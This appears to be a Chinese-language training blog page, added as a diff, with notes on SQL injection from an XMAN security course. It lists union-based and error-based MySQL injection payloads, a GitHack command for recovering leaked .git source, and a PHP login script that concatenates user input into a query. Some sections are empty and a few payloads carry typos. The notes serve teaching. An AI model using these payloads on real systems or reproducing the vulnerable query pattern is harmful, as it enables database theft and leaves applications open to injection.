@@ -1,0 +1,143 @@
+<p>title:  Xman_web   </p>
+<p>tags: web  </p>
+<p>date: 2019/8/5  </p>
+<p>categories:  xman</p>
+<hr>
+<h2 id="sql注入高级解析"><a href="#sql注入高级解析" class="headerlink" title="sql注入高级解析"></a>sql注入高级解析</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>sql注入漏洞可能是被人知道最多</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><h3 id="易出现问题点"><a href="#易出现问题点" class="headerlink" title="易出现问题点"></a>易出现问题点</h3><h3 id="SQL注入demo"><a href="#SQL注入demo" class="headerlink" title="SQL注入demo"></a>SQL注入demo</h3><h3 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h3><ul>
+<li><p>Union注入</p>
+</li>
+<li><p>报错注入</p>
+</li>
+<li><p>Boolean注入</p>
+</li>
+<li><p>Timing注入</p>
+<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><ul>
+<li><p>有回显,可以看到某些字段的回显结果(一般情况)</p>
+</li>
+<li><p>猜解出字段数目</p>
+</li>
+<li><p>最方便的注入方式</p>
+</li>
+<li><p>Union 语句可以填充查询结果, 并且额外执行一次查询</p>
+<p><em>union关键词经常被过滤</em></p>
+<h5 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h5><p>?id=1’  加入’ 后报错,  <img src="1565009441890.png" alt="i"></p>
+<p>再在最后面加上注释符:  –+或者 # ,%23.注释掉多余的’ 执行成功  </p>
+<p><img src="1565009687909.png" alt="1565009687909"></p>
+<p><img src="1565009705461.png" alt="1565009705461"></p>
+<p>order by 来判断字节,可以看出3的时候,回显正常.再利用union查询  (但这里要注意的是,1前面加上-,这样union前面执行错误,会执行后面语句.<img src="1565009796441.png" alt="1565009796441"></p>
+<p><img src="1565009879904.png" alt="1565009879904"></p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>``` txt
+利用内置函数爆数据库信息及相关信息  version()  database()  user()  current_user()  @@datadir 数据库路径  @@basedir mysql安装路径  @@version_compile_os 操作系统
+```</code></pre><h5 id="SQL注入漏洞一般步骤"><a href="#SQL注入漏洞一般步骤" class="headerlink" title="SQL注入漏洞一般步骤"></a>SQL注入漏洞一般步骤</h5><ol>
+<li><p>爆字段长度 order by num –+</p>
+</li>
+<li><p>匹配字段  and 1=2 union select 1,2,3,4,5… –+</p>
+</li>
+<li><p>利用内置函数爆数据库信息</p>
+<pre><code class="sql">(MySQL&gt;5.0)
+ 获取数据库  and 1=2 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>(<span class="number">0</span>为第一个开始记录),<span class="number">1</span>(显示<span class="number">1</span>条记录) <span class="comment">--+</span>
+ 获取表  <span class="keyword">and</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'数据库名字'</span>(最常用的是十六进制表示的数据库) <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="comment">--+</span>
+ 获取列  <span class="keyword">and</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema = <span class="number">0</span>x十六进制数据库 <span class="keyword">and</span> tanle_name = <span class="number">0</span>x十六进制表 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="comment">--+</span></code></pre>
+<pre><code class="sql">一般后台输入id闭合有 $id, '$id', "$id", ('$id'), ("$id")</code></pre>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><em>无正常会显示报错注入</em></p>
+<p><em>在单引号后面加and在加报错语句就行了</em></p>
+<pre><code class="txt">extractvalue(1,concat(0x7e,(select @@version),0x7e))  、
+extractvalue(rand(),concat(0x3a,version())),1
+updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+//利用updatexml(1,2,3)函数注入，不用管该函数什么意思，只要知道当中间2的值不符合xpath_string格式就会报错，爆出查询内容，可配合concat(1,###,1)使用。ExtractValue()与upadtexml()用法差不多
+
+select exp(~(select * FROM(SELECT USER())a))  
+//double数值类型超出范围, exp溢出报错 mysql&gt; select exp(~(select*from(select user())x)); （通过exp溢出，~取反，子查询（子查询的结果被主查询使用）进行注入，意思是主查询虽然被报错了，但子查询执行了.
+
+select !(select * from (select user())x) - ~0  (上面两个减号)
+//bigint超出范围；~0是对0逐位取反，就是对~0进行加减1运算导致溢出报错，而1由!(双重查询语句)构成，子查询会在报错进行查询,很大的版本在5.5.5及其以上
+
+select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+//mysql重复特性，此处重复了version，所以报错。
+
+通过floor报错,注入语句如下:
+select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+通过NAME_CONST报错,注入语句如下:
+and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+通过join报错,注入语句如下:
+select * from(select * from mysql.user ajoin mysql.user b)c;
+
+通过GeometryCollection()报错,注入语句如下:
+and GeometryCollection(()select *from(select user () )a)b );
+
+通过polygon ()报错,注入语句如下:
+and polygon (()select * from(select user ())a)b );
+
+通过multipoint ()报错,注入语句如下:
+and multipoint (()select * from(select user() )a)b );
+
+通过multlinestring ()报错,注入语句如下:
+and multlinestring (()select * from(selectuser () )a)b );
+
+通过multpolygon ()报错,注入语句如下:
+and multpolygon (()select * from(selectuser () )a)b );
+
+通过linestring ()报错,注入语句如下:
+and linestring (()select * from(select user() )a)b );
+
+#仅可以报错出数据库名、表名的语句
+polygon(id)
+linestring(id)
+multipolygon(id)
+linestring(id)
+multilinestring(id)
+1&apos; and polygon(id) and&apos;
+1&apos; and linestring(id) and&apos;
+# Illegal non geometric &apos;`supersqli`.`words`.`id`&apos; value found during parsing</code></pre>
+</li>
+</ol>
+<h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p><img src="1565011247673.png" alt="1565011247673">  </p>
+<h4 id="Timing盲注"><a href="#Timing盲注" class="headerlink" title="Timing盲注"></a>Timing盲注</h4><p><img src="1565011296148.png" alt="1565011296148"></p>
+<h3 id="SQL注入实例"><a href="#SQL注入实例" class="headerlink" title="SQL注入实例"></a>SQL注入实例</h3><p>地址: <a href="http://207.246.92.120:8001/">http://207.246.92.120:8001/</a></p>
+<p>git源码泄露—&gt;恢复源码</p>
+<pre><code class="cmd">python GitHack.py http://www.example.cm/.git/</code></pre>
+<p>源码分析:  </p>
+<pre><code class="php"><span class="meta">&lt;?php</span>
+        session_start();
+        <span class="keyword">require</span>(<span class="string">'db.php'</span>);
+        <span class="keyword">require</span>(<span class="string">'flag.php'</span>);
+        <span class="keyword">if</span> ((<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])))
+        {
+            <span class="keyword">try</span>
+            {
+                $user=$_POST[<span class="string">'username'</span>];
+                $pwd=md5($_POST[<span class="string">'password'</span>]);
+                $query=<span class="string">"SELECT password FROM admin WHERE username='"</span>.$user.<span class="string">"'"</span>;
+                $result=$pdo-&gt;query($query);
+                <span class="keyword">if</span> ($result!=<span class="keyword">null</span>&amp;&amp;$result-&gt;rowCount()!==<span class="number">0</span>)
+                {
+                    <span class="keyword">while</span>($row = $result-&gt;fetch())
+                    {
+                        <span class="keyword">if</span> ($row[<span class="string">'password'</span>]===$pwd)
+                            <span class="keyword">echo</span> $flag;
+                        <span class="keyword">else</span>
+                        {
+                            <span class="keyword">echo</span> <span class="string">'&lt;div class="alert alert-error"&gt; &lt;a class="close" data-dismiss="alert"&gt;×&lt;/a&gt;&lt;strong&gt;密码错误&lt;/strong&gt;&lt;/div&gt;'</span>;
+                        }
+                    }
+                }
+                <span class="keyword">else</span>
+                {
+                    <span class="keyword">echo</span> <span class="string">'&lt;div class="alert alert-error"&gt; &lt;a class="close" data-dismiss="alert"&gt;×&lt;/a&gt;&lt;strong&gt;用户名错误&lt;/strong&gt;&lt;/div&gt;'</span>;
+                }
+            }
+            <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)
+            {
+                <span class="keyword">echo</span> <span class="string">'&lt;div class="alert alert-error"&gt; &lt;a class="close" data-dismiss="alert"&gt;×&lt;/a&gt;&lt;strong&gt;用户名错误&lt;/strong&gt;&lt;/div&gt;'</span>;
+            }
+        }
+        <span class="meta">?&gt;</span></code></pre>
+<p>sqlmap跑或者盲注</p>
+<h3 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h3>
